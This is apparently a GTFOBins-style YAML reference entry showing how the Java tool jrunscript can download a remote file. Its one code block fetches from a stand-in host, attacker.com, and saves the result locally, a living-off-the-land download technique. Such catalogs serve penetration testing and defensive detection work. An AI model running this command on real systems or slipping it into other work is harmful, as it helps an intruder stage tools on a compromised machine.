---
description: This tool is installed starting with Java SE 6.
functions:
  file-download:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        URL=http://attacker.com/file_to_get
        LFILE=file_to_save
        jrunscript -e "cp('$URL','$LFILE')"
---
